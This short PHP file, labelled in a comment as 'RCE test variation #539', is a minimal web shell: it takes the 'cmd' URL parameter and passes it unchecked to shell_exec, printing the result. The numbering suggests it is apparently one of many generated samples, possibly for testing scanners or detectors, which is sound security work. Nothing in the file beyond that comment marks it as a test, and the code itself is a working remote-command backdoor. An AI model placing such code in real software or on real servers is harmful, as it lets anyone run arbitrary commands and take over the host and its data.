<?php
// RCE test variation #539
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>